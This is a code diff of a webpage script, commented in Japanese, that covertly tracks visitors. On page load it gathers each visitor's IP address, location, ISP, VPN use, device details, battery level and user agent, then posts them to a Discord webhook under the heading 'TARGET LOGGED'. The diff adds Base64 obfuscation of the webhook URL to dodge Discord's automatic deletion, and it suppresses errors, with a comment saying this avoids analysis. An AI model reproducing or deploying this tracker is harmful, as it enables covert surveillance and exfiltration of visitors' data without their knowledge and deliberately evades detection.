@@ -1,40 +1,44 @@
 <script type="text/javascript">
-(async function(){
+(async function() {
     try {
-        // 1. Webhook URLをBase64で隠す（Discordの自動削除対策）
-        const b64 = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87"; 
-        const w = atob(b64);
+        // Webhook URLをBase64で隠蔽（Discordボットによる自動削除対策）
+        const _0x1f2e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MDg1ODk1OTE0ODQ4NjY5OC9yb2dSQWpFSlY0VUJQTlB1cTZ2Q1MxbUk0NEM3N3c3NzFXZEI3UldxaDY5NkxLOUlPUDY1NFNzZlQxeZlWEpWRjg3";
+        const _0x5a12 = atob(_0x1f2e);
 
-        // 2. IP情報を取得
-        const res = await fetch('https://ipapi.co/json/');
-        const i = await res.json();
+        // 1. IPアドレスと位置情報の取得
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const d = await ipRes.json();
 
-        // 3. バッテリー情報（取得できないブラウザもあるのでエラー回避）
+        // 2. 拡張デバイス情報の収集
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const vpn = (tz !== d.timezone) ? "⚠️ VPN/Proxy 検出" : "REAL IP";
+        
         let bat = "N/A";
         try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e){}
 
-        // 4. 送信データ作成
+        // 3. Discord用ペイロードの構築
         const payload = {
             embeds: [{
-                title: "🚨 TARGET DETECTED",
-                color: 15548997,
+                title: "💀 TARGET LOGGED",
+                color: 16711680, // 赤色
                 fields: [
-                    { name: "🌐 Network", value: `IP: ${i.ip}\nCity: ${i.city}\nOrg: ${i.org}`, inline: true },
-                    { name: "📱 Device", value: `OS: ${navigator.platform}\nBattery: ${bat}\nLang: ${navigator.language}`, inline: true },
-                    { name: "🔍 User-Agent", value: navigator.userAgent }
+                    { name: "🌐 Network", value: `**IP:** ${d.ip}\n**VPN:** ${vpn}\n**ISP:** ${d.org}\n**Loc:** ${d.city}, ${d.country_name}`, inline: false },
+                    { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**Core:** ${navigator.hardwareConcurrency}\n**Bat:** ${bat}\n**Lang:** ${navigator.language}`, inline: true },
+                    { name: "🔍 Browser", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                 ],
+                footer: { text: "ADLOL Tracking System" },
                 timestamp: new Date()
             }]
         };
 
-        // 5. Discordへ送信
-        await fetch(w, {
+        // 4. 送信実行
+        await fetch(_0x5a12, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
     } catch (err) {
-        console.error("Error:", err);
+        // エラー時は静かに終了（解析を避けるため）
     }
 })();
 </script>
